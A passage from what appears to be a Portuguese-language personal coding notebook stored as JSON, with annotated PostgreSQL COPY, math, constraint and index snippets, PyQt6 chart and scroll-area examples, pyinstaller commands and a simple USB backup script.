dado.\n\n/* COPY nome da tabela, significa para pegar os dados e colocar na\ntabela especificada.\nFROM indica o caminho completo do arquivo.\nWITH(FORMAT CSV, HEADER) indica que as colunas est\u00e3o separadas\npor v\u00edrgulas e exclui a primeira linha na tabela, pois n\u00e3o s\u00e3o dados\n\n\n\nCOPY table_name \nFROM 'C:\\YourDirectory\\your_file.csv' \nWITH (FORMAT CSV, HEADER); \n\nDiz para separar as colunas com o '|'\nDELIMITER '|' \n\n/* Caso n\u00e3o tenha todas a colunas preenchidas por dedos\nvoc\u00ea vai precisa importar colunas espec\u00edficas, \ncom abaixo*/\n\nCOPY supervisor_salaries (town, supervisor, salary)\nFROM 'C:\\Users\\pcleu\\Documents\\supervisor_salaries.csv'\nWITH (FORMAT CSV, HEADER);\n\nDELETE FROM supervisor_salaries;\n\n/* Esse codigo \u00e9 depois de ter colocado os dados na\ntabela tempor\u00e1ria. Isere na tabela fixa \nos valores da tabela tempor\u00e1ria, usando o \nSELECT seleciona as colunas e coloca um valor\nentre aspas a partir da tablea tepor\u00e1ria\ncount - n\u00e3o tem valor especificado na base de dados\nque recebemos*/\n\nINSERT INTO supervisor_salaries (town, county, supervisor, salary)\nSELECT town, 'Some County', supervisor, salary\nFROM supervisor_salaries_temp;\n\n/* Deleta a tebela tempor\u00e1ria */\nDROP TABLE supervisor_salaries_temp;\n\n/* Esse c\u00f3digo exporta dos dados para um arquivo\nde texto .txt, e ao inv\u00e9s da v\u00edrgula usa a barra\nespecificada pelo DELIMITER '|'*/\nCOPY us_counties_2010\nTO 'C:\\Users\\pcleu\\Documents\\exportando_todos_dados.txt'\nWITH (FORMAT CSV, HEADER, DELIMITER '|');\n\n/* Esse c\u00f3digo exporta apenas as colunas\ndesejadas para o arquivo .txt*/\nCOPY us_counties_2010 (geo_name, internal_point_lat, internal_point_lon)\nTO 'C:\\Users\\pcleu\\Documents\\exportando_todos_dados.txt'\nWITH (FORMAT CSV, HEADER, DELIMITER '|');\n\n/* Esse c\u00f3digo exporta apenas duas colunas \ne nomes que tenham mill, sem diferencia\u00e7\u00e3o\nde mai\u00fasculo ou min\u00fasculo*/\nCOPY (\n\tSELECT geo_name, state_us_abreviation\n\tFROM us_counties_2010\n\tWHERE geo_name ILIKE '%mill%')\nTO 'C:\\Users\\pcleu\\Documents\\exportando_todos_dados.txt'\nWITH (FORMAT CSV, HEADER, DELIMITER '|');\n\n/* Vale lembra que ele j\u00e1 cria o arquivo para voce\n*/\nCOPY\n\t(SELECT \n\tdate_part('hour', embarque) AS trip_hour,\n\tcount(*)\n\tFROM nyc_yellow_taxi_trips_2016_06_01\n\tGROUP BY trip_hour\n\tORDER BY trip_hour\n\t)\nTO 'C:\\Users\\pcleu\\Documents\\hourly_pickups_2016_06_01.csv'\nWITH (FORMAT CSV, HEADER, DELIMITER ',');\n\n\n/*\nusamos o COPY para importar os dados de forma bruta para\numa coluna nova que foi criada na tabela na hora da importa\u00e7\u00e3o,\nHEADER OFF diz que o arquivo n\u00e3o tem cabe\u00e7alho, o QUOTE\ndiz que o arquivo os dados s\u00e3o separados por ' \" ' aspas \nduplas\n\n*/\n\nCOPY crime_reports (original_text)\nFROM 'C:\\Users\\pcleu\\Documents\\crime_reports.csv'\nWITH (FORMAT CSV, HEADER OFF, QUOTE '\"');\n\n\n\nCOPY crime_reports (original_text)\nFROM 'C:\\Users\\pcleu\\Documents\\crime_reports.csv'\nWITH (FORMAT CSV, HEADER OFF, QUOTE '\"');\n\n/*\nAqui temos uma ideia melhor sobre o QUOTE, \nnesse caso em especial, os dados s\u00e3o separados por '|' no\narquivo csv, sendo assim tem uma parque que \u00e9 o discurso \ndo presidente, esse discurso o come\u00e7o e o fim \u00e9 separado po '|' \nnormalmente, por\u00e9m, pode ser que no meio tenha um '|' o que vai fazer\nque na hora da importa\u00e7\u00e3o, o sql parta esse discurso no meio, \nentendendo que a '|' seja um delimitador, ent\u00e3o no comeco do texto\ntem o @ e o final tamb\u00e9m @ text@, dessa forma o sql ignora os falsos delimitadores\n*/\n\nCOPY president_speeches(president, title, speech_date, search_speech_text)\nFROM 'C:\\Users\\pcleu\\Documents\\sotu-1946-1977.csv'\nWITH (FORMAT CSV, DELIMITER '|', HEADER OFF, QUOTE'@');"}, "grafico de pizza ": {"codigo": "import sys\nfrom PyQt6.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget\nfrom matplotlib.backends.backend_qt6agg import FigureCanvasQTAgg as FigureCanvas\nfrom matplotlib.figure import Figure\nimport numpy as np\n\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        super().__init__()\n\n        self.setWindowTitle(\"Gr\u00e1fico de Pizza com PyQt6 e Matplotlib\")\n        self.setGeometry(100, 100, 800, 600)\n\n        self.central_widget = QWidget(self)\n        self.setCentralWidget(self.central_widget)\n\n        self.layout = QVBoxLayout(self.central_widget)\n\n        self.create_plot()\n\n    def create_plot(self):\n        # Criando uma figura do Matplotlib\n        self.figure = Figure()\n        self.canvas = FigureCanvas(self.figure)\n\n        # Adicionando o gr\u00e1fico \u00e0 interface gr\u00e1fica\n        self.layout.addWidget(self.canvas)\n\n        # Criando dados para o gr\u00e1fico de pizza\n        labels = ['Categoria 1', 'Categoria 2', 'Categoria 3', 'Categoria 4']\n        sizes = [15, 30, 45, 10]  # Porcentagens para cada categoria\n\n        # Adicionando o gr\u00e1fico de pizza \u00e0 figura\n        ax = self.figure.add_subplot(111)\n        ax.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=90)\n        ax.axis('equal')  # Assegura que a pizza seja desenhada como um c\u00edrculo\n\n        ax.set_title('Gr\u00e1fico de Pizza')\n\n        # Atualizando o canvas\n        self.canvas.draw()\n\nif __name__ == \"__main__\":\n    app = QApplication(sys.argv)\n    window = MainWindow()\n    window.show()\n    sys.exit(app.exec())\n", "categoria": "PyQt6"}, "grafico de colunas": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout\nfrom matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas\nfrom matplotlib.figure import Figure\nimport numpy as np\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.setMinimumSize(400, 400)\n\t\tself.setWindowTitle('Gr\u00e1fico de Colunas')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\n\tdef setUpMainWindow(self):\n\t\tself.grafico_coluna()\n\n\t\t\n\t\t\n\tdef grafico_coluna(self):\n\t\t# Criando uma inst\u00e2ncia da classe Figure do Matplotlib\n\t\tself.figure = Figure()\n\t\tself.canvas = FigureCanvas(self.figure)\n\n\t\t# Dados para o gr\u00e1fico de colunas\n\t\tlabels = ['Categoria 1', 'Categoria 2', 'Categoria 3', 'Categoria 4']\n\t\tvalues = [10, 30, 15, 25]\n\n\t\t# Adicionando o gr\u00e1fico de colunas \u00e0 figura\n\t\tax = self.figure.add_subplot(111)\n\t\tax.bar(labels, values, color='red')  # Troque 'blue' por 'red' para barras vermelhas\n\n\t\t# Adicionando r\u00f3tulos e t\u00edtulo\n\t\tax.set_xlabel('Categorias')\n\t\tax.set_ylabel('Valores')\n\t\tax.set_title('Gr\u00e1fico de Colunas')\n\n\t\t# Criando um layout vertical para conter o gr\u00e1fico\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(self.canvas)\n\n\t\t# Configurando o layout principal no widget principal\n\t\t\n\t\t\n\t\t# Atualizando o canvas\n\t\t\n\t\t\n\t\tself.figure_2 = Figure()\n\t\tself.canvas_2 = FigureCanvas(self.figure_2)\n\t\t\n\t\tlabels_2 = ['Categoria 6', 'categoria 7', 'categoria 8', 'categoria 9']\n\t\tvalues_2 = [12, 89,23, 45]\n\t\t\n\t\tax_2 = self.figure_2.add_subplot(111)\n\t\tax_2.bar(labels_2, values_2, color='yellow')\n\t\t\n\t\tax_2.set_xlabel('Categorias 2')\n\t\tax_2.set_ylabel('Valores 2')\n\t\tax_2.set_title('Gr\u00e1fico de Colunas 2')\n\t\t\n\t\tmain_v_box.addWidget(self.canvas_2)\n\t\tself.setLayout(main_v_box)\n\n\t\tself.canvas.draw()\n\t\tself.canvas_2.draw()\n\n\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "Math - matem\u00e1tica b\u00e1sica ": {"categoria": "SQL ", "codigo": "+ \nAdi\u00e7\u00e3o \n- \nSubtra\u00e7\u00e3o \n* \nMultiplica\u00e7\u00e3o\n/ \nDivis\u00e3o(retorna apenas o cosciente, sem resto) \n% \nModulo (retorna apenas o restante) \n^ \nExpoencia\u00e7\u00e3o \n|/ ou sqrt(numero)\nRaiz quadrada \n||/ \nRaiz c\u00fabica \n! \nFatorial \n\nSe dividir como a primeira linha a seguir, ser\u00e1 retornado um n\u00famero inteiro sem o resto\npara que voce consiga o numero e as casas depois da v\u00edrgula,\no dado tem que ser com .0, ou usar o CAST para modificar o dado para numeric\n\nSELECT 11 / 6;\nSELECT 11.0 / 6;\nSELECT CAST (11 as numeric(3,1)) / 6;\n\nSomando duas colunas e retornando uma terceira com o resultado\nda somat\u00f3ria\n\nSELECT geo_name,\n\tstate_us_abreviation AS \"st\",\n\tp0010003 AS \"White Alone\",\n\tp0010004 AS \"Black Alone\",\n\tp0010003 + p0010004 AS \"Total White and Black Alone\"\nFROM us_counties_2010;\t\n\nsoma todas as ra\u00e7as e coloca em uma coluna nova All Races, \np0010001 j\u00e1 s\u00e3o todas as ra\u00e7as tamb\u00e9m\ntodas as ra\u00e7as somadas - todas as ra\u00e7as do banco de dados\n\u00e9 igual a 0\n\nSELECT geo_name, \n\tstate_us_abreviation AS \"st\",\n\tp0010001 AS \"Total\",\n\tp0010003 + p0010004 + p0010005 + p0010006 + p0010007\n\t+ p0010008 + p0010009 AS \"All Races\",\n\t\n\t(p0010003 + p0010004 + p0010005 + p0010006 + p0010007\n\t\t+ p0010008 + p0010009) - p0010001 AS \"Difference\"\nFROM us_counties_2010\nORDER BY \"Difference\" DESC;\n\n\nSELECT geo_name, \nstate_us_abbreviation AS \"st\", \n(CAST (p0010006 AS numeric(8,1)) / p0010001) * 100 AS \"pct_asian\" \nFROM us_counties_2010 \nORDER BY \"pct_asian\" DESC; \n\nSELECT department,\n\t\tspend_2014,\n\t\tspend_2017,\n\t\tround( (spend_2017 - spend_2014) / spend_2014 * 100, 1) AS \"pct_change\"\nFROM percent_change;\n\n/* Somamos todas as informa\u00e7\u00f5e da coluna\nespecificada e tiramos a m\u00e9dia dela*/\nSELECT sum(p0010001) AS \"County Sum\",\n\tround(avg(p0010001), 0) AS \"County Averagge\"\nFROM us_counties_2010;\n\n\n/* O percentile_cont() faz encontrar a m\u00e9diana\nde forma precisa, fazendo a m\u00e9dia dos dois\nn\u00fameros que tem uma lista par,\no percetile_disc() arrendonda para um valor\nmais pr\u00f3ximo que est\u00e1 na lista*/\nSELECT \npercentile_cont(0.5)\nWITHIN GROUP (ORDER BY numbers)\nFROM percentile_test;\n\n\n\n\n/*WITHIN GROUP significa que que voce est\u00e1 informando\nde onde os dados est\u00e3o saindo para fazer a mediana\nno caso est\u00e1 saindo da coluna p0010001 */\nSELECT sum(p0010001) AS \"County Sum\",\n\tround(avg(p0010001), 0) AS \"County Average\",\n\tpercentile_cont(0.5)\n\tWITHIN GROUP (ORDER BY P0010001) AS \"County Median\"\n\tFROM us_counties_2010;\n\n\n\n/* Aqui calcula a mediana para para cada\nparte da porcentagem a ser cortada*/\nSELECT percentile_cont(array[.25,.5,.75])\n\tWITHIN GROUP (ORDER BY P0010001) AS \"quartiles\"\nFROM us_counties_2010;\n\n/*Transformando em linha ao invez de colunas*/\nSELECT unnest(\n\tpercentile_cont(array[.25,.5,0.75])\n\tWITHIN GROUP (ORDER BY p0010001))\n\tAS \"quartiles\"\n\t\nFROM us_counties_2010;\n\n/*Achar a moda*/\n\nSELECT mode() WITHIN GROUP (ORDER BY p0010001) \nFROM us_counties_2010; \n\n\n/* Fazendo contas \n*/\nSELECT city, st, population, property_crime,\n\tround( (property_crime::numeric / population) * 1000, 1) AS pc_per_1000\nFROM fbi_crime_data_2015\nWHERE population >= 500000\nORDER BY pc_per_1000 DESC;\n\n\nO tipo retornado para um c\u00e1lculo ir\u00e1 variar dependendo da opera\u00e7\u00e3o\ne o tipo de dados dos n\u00fameros de entrada.\nEm c\u00e1lculos com um operador entre dois n\u00fameros \u2013 adi\u00e7\u00e3o,\nsubtra\u00e7\u00e3o, multiplica\u00e7\u00e3o e divis\u00e3o \u2014 o tipo de dados retornado segue\nesse padr\u00e3o:\nDois n\u00fameros inteiros retornam um n\u00famero inteiro.\nUm num\u00e9rico em qualquer lado do operador retorna um num\u00e9rico.\nQualquer coisa com um n\u00famero de ponto flutuante retorna um n\u00famero de ponto flutuante\nn\u00famero do tipo precis\u00e3o dupla.\nNo entanto, as fun\u00e7\u00f5es de exponencia\u00e7\u00e3o, raiz e fatorial s\u00e3o\ndiferente. Cada um pega um n\u00famero antes ou depois do operador e\nretorna tipos num\u00e9ricos e de ponto flutuante, mesmo quando a entrada \u00e9 um\ninteiro."}, "arquivo executavel - transforma um programa pyhton em arquivo executavel": {"categoria": "Python Geral", "codigo": "pyinstaller --onefile --distpath= output_dir scripts/*.py --add-data \"base_data;base_data\"\npyinstaller --onefile pratica.py\n\npyinstaller --onefile --noconsole pratica.py\n\npyinstaller --onefile --noconsole C:\\Users\\pcleu\\Desktop\\conc_med\\conci_med.py\n\npyinstaller --onefile --icon=seu_icone.ico seu_script.py\n\npyinstaller --onefile --noconsole --icon=C:\\Users\\pcleu\\Desktop\\Caderno_virtual\\ico.ico C:\\Users\\pcleu\\Desktop\\Caderno_virtual\\TaskFlow.py\n\n\n\nCoverter uma imagem em formato icone\nhttps://www.freeconvert.com/pt/jpg-to-ico/download"}, "backup": {"codigo": "import shutil\nimport os\n\ndef enviar_para_pendrive(caminho_arquivo_origem, letra_pendrive):\n    try:\n        # Verifica se o pendrive est\u00e1 conectado\n        if os.path.exists(letra_pendrive + \":\\\\\"):\n            caminho_destino = letra_pendrive + \":\\\\\"\n            shutil.copy(caminho_arquivo_origem, caminho_destino)\n            print(f\"Arquivo enviado com sucesso para {caminho_destino}\")\n        else:\n            print(\"Pendrive n\u00e3o encontrado.\")\n    except Exception as e:\n        print(f\"Ocorreu um erro: {str(e)}\")\n\n# Exemplo de uso\narquivo_origem = \"C:\\\\Caminho\\\\Para\\\\Seu\\\\Arquivo.txt\"  # Substitua pelo caminho do seu arquivo\nletra_do_pendrive = \"E\"  # Substitua pela letra correspondente ao seu pendrive\n\nenviar_para_pendrive(arquivo_origem, letra_do_pendrive)\n", "categoria": "Python Geral"}, "QScrollArea() - \u00c1rea de deslise": {"categoria": "PyQt6", "codigo": "from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QPushButton,\nQScrollArea)\nimport sys\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\tdef initializeUI(self):\n\t\tself.setFixedSize(400, 600)\n\t\tself.setWindowTitle('Scroll Area')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t#Cria o widget para conter os itens\n\t\twidget_itens = QWidget()\n\t\t#Cria o layout que ser\u00e1 dentro do scroll\n\t\titens_layout = QVBoxLayout(widget_itens)\n\t\t\n\t\tfor i in range(100):\n\t\t\tbutton = QPushButton(f'Bot\u00e3o{i+1}')\n\t\t\titens_layout.addWidget(button)\n\t\t\n\t\t#Scroll Area\n\t\tscroll_area = QScrollArea()\n\t\tscroll_area.setWidget(widget_itens)\n\t\t\n\t\t#Layou da p\u00e1gina\n\t\tlayout = QVBoxLayout()\n\t\tlayout.addWidget(scroll_area)\n\t\tself.setLayout(layout)\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\nVERS\u00c3O COMPLETA COM QMAINWINDOW##################################\n\n\nimport sys\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout,\n\t\t\t\t\t\t\t QWidget, QScrollArea, QHBoxLayout)\n\n\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Bot\u00f5es')\n\t\tself.setUpMainWindow()\n\t\tself.showMaximized()\n\n\tdef setUpMainWindow(self):\n\t\t# Criamos e setamos o widget central\n\t\tcentral_widget = QWidget()\n\t\tcentral_widget.setObjectName('CentralWidget')\n\t\tself.setCentralWidget(central_widget)\n\n\t\t# Criamos o widget lateral que vai o layout nos bot\u00f5es e depois setamos\n\t\t# nas scroll area\n\t\tside_widget = QWidget()\n\t\tside_widget.setObjectName('SideWidget')\n\n\t\t# Criamos o widget que vai receber o conte\u00fado do lado do scroll\n\t\tmain_content = QWidget()\n\t\tmain_content.setObjectName('MainWidget')\n\n\t\t# Criando o objeto scroll_area\n\t\tscroll_area = QScrollArea()\n\t\tscroll_area.setFixedWidth(130)\n\t\tscroll_area.setWidgetResizable(True)\n\n\t\t# Criamos o layout que vai dentro do side_widget\n\t\tside_layout = QVBoxLayout()\n\n\t\t# Adicionando os bot\u00f5es no layout vertical\n\t\tbuttons = {\n\t\t\t\"Home\": self.on_home_clicked,\n\t\t\t\"Configura\u00e7\u00f5es\": self.on_config_clicked,\n\t\t\t\"Usu\u00e1rios\": self.on_users_clicked,\n\t\t\t\"Logs\": self.on_logs_clicked,\n\t\t\t\"Backup\": self.on_backup_clicked,\n\t\t\t\"Rede\": self.on_network_clicked,\n\t\t\t\"Sistema\": self.on_system_clicked,\n\t\t\t\"Servi\u00e7os\": self.on_services_clicked,\n\t\t\t\"Armazenamento\": self.on_storage_clicked\n\t\t}\n\n\t\tfor btn_text, btn_function in buttons.items():\n\t\t\tbutton = QPushButton(btn_text)\n\t\t\tbutton.setFixedSize(90, 90)\n\t\t\tbutton.clicked.connect(btn_function)  # Conectando o clique do bot\u00e3o \u00e0 fun\u00e7\u00e3o espec\u00edfica\n\t\t\tside_layout.addWidget(button)\n\n\t\tside_widget.setLayout(side_layout)\n\n\t\tscroll_area.setWidget(side_widget)  # Setamos o scroll com o widget\n\n\t\t# Fazemos o layout principal da tela\n\t\tmain_layout = QHBoxLayout()\n\t\tmain_layout.addWidget(scroll_area)\n\t\tmain_layout.addWidget(main_content)\n\t\tcentral_widget.setLayout(main_layout)\n\n\tdef on_home_clicked(self):\n\t\tprint(\"Bot\u00e3o Home clicado!\")\n\n\tdef on_config_clicked(self):\n\t\tprint(\"Bot\u00e3o Configura\u00e7\u00f5es clicado!\")\n\n\tdef on_users_clicked(self):\n\t\tprint(\"Bot\u00e3o Usu\u00e1rios clicado!\")\n\n\tdef on_logs_clicked(self):\n\t\tprint(\"Bot\u00e3o Logs clicado!\")\n\n\tdef on_backup_clicked(self):\n\t\tprint(\"Bot\u00e3o Backup clicado!\")\n\n\tdef on_network_clicked(self):\n\t\tprint(\"Bot\u00e3o Rede clicado!\")\n\n\tdef on_system_clicked(self):\n\t\tprint(\"Bot\u00e3o Sistema clicado!\")\n\n\tdef on_services_clicked(self):\n\t\tprint(\"Bot\u00e3o Servi\u00e7os clicado!\")\n\n\tdef on_storage_clicked(self):\n\t\tprint(\"Bot\u00e3o Armazenamento clicado!\")\n\n\nif __name__ == \"__main__\":\n\tstyle_sheet = '''\n\t\tQScrollArea {\n\t\t\tborder: none;\n\t\t}\n\t\tQScrollBar:vertical {\n\t\t\twidth: 10px;\n\t\t\tbackground: transparent;\n\t\t}\n\t\tQScrollBar::handle:vertical {\n\t\t\tbackground: gray;\n\t\t\tmin-height: 20px;\n\t\t}\n\t\tQScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {\n\t\t\theight: 0;\n\t\t}\n\t\tQScrollBar:vertical:hover {\n\t\t\tbackground: rgba(0, 0, 0, 0.2);\n\t\t}\n\t\t\n\t\tQWidget#SideWidget {\n\t\t\tbackground: #FFA500; /* Amarelo */\n\t\t}\n\t\t\n\t\tQWidget#CentralWidget {\n\t\t\tbackground: #008000;\n\t\t}\n\t\t\n\t\tQWidget#MainWidget {\n\t\t\tbackground: #0000FF;\n\t\t}\n\t\t\n\t\tQPushButton {\n\t\t\tbackground-color: #000000;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #FFFFFF;\n\t\t}\n\t\tQPushButton:pressed {\n\t\t\tbackground-color: #C86354;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #DFD8D7;\n\t\t}\n\t'''\n\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\nVERS\u00c3O COMPLETA DO SCROLLAREA() ######################################\n####################################################################\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel, QLineEdit, QPushButton, QComboBox, QScrollArea, QVBoxLayout, QHBoxLayout)\nimport sys\nimport json\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('P\u00e1gina Din\u00e3mica de Vendas')\n\t\tself.itens_selecionado_venda = {}\n\t\tself.estoque = {}\n\t\tself.carregar_estoque()\n\t\tself.setUpMainWindow()\n\t\tself.info_item_combo()\n\t\tself.showMaximized()\n\n\tdef setUpMainWindow(self):\n\t\tself.combo_box = QComboBox()\n\t\tself.combo_box.setFixedSize(350, 30)\n\t\tself.combo_box.addItems(list(self.estoque.keys()))\n\t\tself.combo_box.currentTextChanged.connect(self.info_item_combo)\n\n\t\tself.quantidade_label = QLabel('Quantidade')\n\t\tself.quantidade_venda_edit = QLineEdit('1')\n\t\tself.quantidade_venda_edit.setFixedSize(60, 30)\n\t\tself.preco_label = QLabel('Pre\u00e7o: R$ ---')\n\t\tself.botao_lancar = QPushButton('Lan\u00e7ar')\n\t\tself.botao_lancar.setFixedSize(50, 30)\n\t\tself.botao_lancar.clicked.connect(self.set_scroll_area)\n\n\t\tself.scroll_area = QScrollArea()\n\t\tself.scroll_area.setWidgetResizable(True)\n\n\t\tself.cabecalho = QHBoxLayout()\n\t\tself.cabecalho.addWidget(self.combo_box)\n\t\tself.cabecalho.addSpacing(30)\n\t\tself.cabecalho.addWidget(self.quantidade_label)\n\t\tself.cabecalho.addWidget(self.quantidade_venda_edit)\n\t\tself.cabecalho.addSpacing(60)\n\t\tself.cabecalho.addWidget(self.preco_label)\n\t\tself.cabecalho.addWidget(self.botao_lancar)\n\n\t\tself.main_window = QVBoxLayout()\n\t\tself.main_window.addLayout(self.cabecalho)\n\t\tself.main_window.addWidget(self.scroll_area)\n\t\tself.setLayout(self.main_window)\n\n\tdef info_item_combo(self):\n\t\titem = self.combo_box.currentText()\n\t\tquantidade = self.estoque[item]['quantidade']\n\t\tpreco = self.estoque[item]['valor']\n\t\tself.quantidade_label.setText(f'Quantidade: {quantidade} und. disp.')\n\t\tself.preco_label.setText(f'Pre\u00e7o: R$: {preco}')\n\n\tdef set_scroll_area(self):\n\t\tself.widget_scroll = QWidget()\n\t\tself.scroll_layout = QVBoxLayout()\n\t\tself.scroll_layout.addStretch(1)\n\n\t\tinfo = {}\n\t\titem = self.combo_box.currentText()\n\t\tquantidade = self.quantidade_venda_edit.text()\n\t\tvalor = self.estoque[item]['valor']\n\n\t\tinfo['quantidade'] = float(quantidade)\n\t\tinfo['valor'] = float(valor)\n\n\t\tself.itens_selecionado_venda[item] = info\n\n\t\tself.widgets_dict = {}\n\t\tnumero = 0\n\t\tfor item, info in self.itens_selecionado_venda.items():\n\t\t\tself.item_label_v = QLabel(item)\n\t\t\tself.quantidade_label_v = QLabel(str(info['quantidade']))\n\t\t\tself.valor_label_v = QLabel(str(info['valor']))\n\t\t\tself.botao_excluir_v = QPushButton(f'x{numero}')\n\t\t\tself.botao_excluir_v.clicked.connect(lambda _, b=self.botao_excluir_v: self.deletar(b))\n\n\t\t\tlinha = QHBoxLayout()\n\t\t\tlinha.addWidget(self.item_label_v)\n\t\t\tlinha.addWidget(self.quantidade_label_v)\n\t\t\tlinha.addWidget(self.valor_label_v)\n\t\t\tlinha.addWidget(self.botao_excluir_v)\n\n\t\t\tself.scroll_layout.insertLayout(self.scroll_layout.count() - 1, linha)\n\n\t\t\tself.widgets_dict[self.botao_excluir_v] = (self.item_label_v, self.quantidade_label_v, self.valor_label_v, item, linha)\n\n\t\t\tnumero += 1\n\t\tself.widget_scroll.setLayout(self.scroll_layout)\n\t\tself.scroll_area.setWidget(self.widget_scroll)\n\n\tdef deletar(self, botaoO):\n\t\titemO, qntO, valorO, itemT, linhaO = self.widgets_dict.pop(botaoO)\n\t\tlinhaO.removeWidget(itemO)\n\t\tlinhaO.removeWidget(qntO)\n\t\tlinhaO.removeWidget(valorO)\n\t\tlinhaO.removeWidget(botaoO)\n\n\t\titemO.deleteLater()\n\t\tqntO.deleteLater()\n\t\tvalorO.deleteLater()\n\t\tbotaoO.deleteLater()\n\n\t\tdel self.itens_selecionado_venda[itemT]\n\n\tdef carregar_estoque(self):\n\t\ttry:\n\t\t\twith open('estoque.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.estoque.update(json.loads(content))\n\t\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\t\tpass\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QWidget - Explorando os widgets como est\u00e9ticos": {"categoria": "PyQt6", "codigo": "from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout,\nQHBoxLayout, QLabel)\nfrom PyQt6.QtGui import QFont, QPixmap\nfrom PyQt6.QtCore import Qt\nimport sys\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\tdef initializeUI(self):\n\t\tself.setFixedSize(400, 600)\n\t\tself.setWindowTitle('Testes Widget')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t#Polenta polenta_i\n\t\tpolenta_imagem = 'polenta.png'\n\t\ttry:\n\t\t\twith open(polenta_imagem):\n\t\t\t\tpolenta_i = QLabel(self)\n\t\t\t\timagem = QPixmap(polenta_imagem)\n\t\t\t\timagem_red = imagem.scaled(100, 100)\n\t\t\t\tpolenta_i.setPixmap(imagem_red)\n\t\t\t\t\n\t\texcept:\n\t\t\tprint('Falha ao carregar a imagem')\n\t\t\n\t\t\n\t\t\n\t\tdescription_box = QWidget()\n\t\tdescription_box.setObjectName('ImageBorder')\n\t\tdescription_box.setFixedHeight(120)\n\t\t\n\t\tpolenta_desc = QLabel()\n\t\tpolenta_desc.setObjectName('ImageInfo')\n\t\tpolenta_desc.setText(\n\t\t\t'''<p>Polenta Vegetariana Street Food</p>\n\t\t\t\t<p>Ingredientes:</p>\n\t\t\t\t<p>-Polenta</p>\n\t\t\t\t<p>-Azeitona</p>\n\t\t\t\t<p>-Azeite</p>\n\t\t\t\t<p>-Lingu\u00e7a vegana</p>''')\n\t\t\t\t\n\t\tpolenta_h_box = QHBoxLayout()\n\t\tpolenta_h_box.addWidget(polenta_desc, 1)\n\t\tpolenta_h_box.addWidget(polenta_i)\n\t\tdescription_box.setLayout(polenta_h_box)\n\t\t\n\t\tpage1_v_box = QVBoxLayout()\n\t\tpage1_v_box.addWidget(description_box)\n\t\tself.setLayout(page1_v_box)\n\t\t\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\t\t\n\t\tQWidget#ImageBorder{\n\t\t\tbackground-color: #F2B960;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #BFBFBF;\n\t\t\t}\n\t\tQLabel#ImageInfo{\n\t\t\tbackground-color: #A52A2A;\n\t\t\tborder-radius: 4px;\n\t\t\t}\n\t\t\t'''\n\t\t\t\n\t\t\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "ALTER TABLE - alterar ou adicionar restricoes em uma tabela": {"categoria": "SQL ", "codigo": "ALTER TABLE table_name DROP CONSTRAINT constraint_name;\n\nALTER TABLE table_name ALTER  COLUMN column_name DROP NOT NULL;\nALTER TABLE not_null_example DROP CONSTRAINT student_id_key; \nALTER TABLE not_null_example ADD CONSTRAINT student_id_key PRIMARY KEY \n(student_id); \nALTER TABLE not_null_example ALTER COLUMN first_name DROP NOT NULL; \nALTER TABLE not_null_example ALTER COLUMN first_name SET NOT NULL; "}, "INDEX - Consulta mais r\u00e1pida": {"categoria": "SQL ", "codigo": "CREATE INDEX street_idx ON new_york_addresses (street); \nDROP INDEX nome;\n\n\nCREATE INDEX embarque_index\nON nyc_yellow_taxi_trips_2016_06_01 (embarque);\n\nEXPLAIN ANALYZE SELECT * FROM new_york_addresses \nWHERE street = 'BROADWAY'; \nEXPLAIN ANALYZE SELECT * FROM new_york_addresses \nWHERE street = '52 STREET'; \nEXPLAIN ANALYZE SELECT * FROM new_york_addresses \nWHERE street = 'ZWICKY AVENUE'; \nListing 7-12: Benchmark queries for index performance \nOn my system, the first query returns these stats: \n\u278a Seq Scan on new_york_addresses (cost=0.00..20730.68 rows=3730 width=46) \n(actual 